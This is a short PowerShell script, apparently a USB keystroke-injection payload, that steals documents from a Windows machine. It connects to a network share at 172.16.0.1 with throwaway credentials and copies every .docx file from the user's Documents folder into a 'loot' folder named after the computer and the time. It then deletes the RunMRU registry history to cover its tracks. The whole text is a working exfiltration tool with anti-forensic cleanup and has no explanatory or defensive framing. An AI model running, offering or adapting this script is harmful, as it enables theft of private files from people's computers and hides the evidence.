$exfil_dir="$Env:UserProfile\Documents"
$exfil_ext="*.docx"
$loot_dir="\\172.16.0.1\Data\$Env:ComputerName\$((Get-Date).ToString('yyyy-MM-dd_hhmmtt'))"
net use \\172.16.0.1\Data /USER:any any;
mkdir $loot_dir
robocopy $exfil_dir $loot_dir $exfil_ext /S /MT /Z
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
